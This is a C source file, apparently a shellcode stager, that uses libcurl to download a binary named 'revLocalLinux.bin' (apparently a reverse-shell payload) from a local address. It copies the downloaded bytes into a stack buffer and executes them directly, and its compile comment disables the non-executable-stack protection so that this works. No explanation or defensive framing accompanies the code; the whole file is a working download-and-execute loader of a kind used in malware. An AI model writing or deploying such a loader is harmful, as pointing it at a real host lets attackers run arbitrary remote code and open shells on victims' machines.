//gcc main.c -z execstack
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
#include <curl/curl.h>
 
struct MemoryStruct {
	  char *memory;
	  size_t size;
};
 
static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;
	struct MemoryStruct *mem = (struct MemoryStruct *)userp;
	
	char *ptr = realloc(mem->memory, mem->size + realsize + 1);
	if(!ptr) {
	/* out of memory! */
	printf("not enough memory (realloc returned NULL)\n");
	return 0;
	}
	
	mem->memory = ptr;
	memcpy(&(mem->memory[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;
	
	return realsize;
}
 
int main(void)
{
	CURL *curl_handle;
	CURLcode res;
	
	struct MemoryStruct chunk;
	
	chunk.memory = malloc(1);  /* grown as needed by the realloc above */
	chunk.size = 0;    /* no data at this point */
	
	curl_global_init(CURL_GLOBAL_ALL);
	curl_handle = curl_easy_init();
	curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1/revLocalLinux.bin");
	
	/* send all data to this function  */
	curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
	
	/* we pass our 'chunk' struct to the callback function */
	curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);
	
	res = curl_easy_perform(curl_handle);
	
	/* check for errors */
	if(res != CURLE_OK) {
		fprintf(stderr, "curl_easy_perform() failed: %s\n",
		    curl_easy_strerror(res));
	}
	else {
		printf("%lu bytes retrieved\n", (unsigned long)chunk.size);
		// printf("%s\n", chunk.memory);
		unsigned char buf[chunk.size];
		memcpy(buf, chunk.memory, chunk.size);
		((void (*)()) buf) ();
	}
	
	/* cleanup curl stuff */
	curl_easy_cleanup(curl_handle);
	
	free(chunk.memory);
	
	/* we are done with libcurl, so clean it up */
	curl_global_cleanup();
	
	return 0;
}
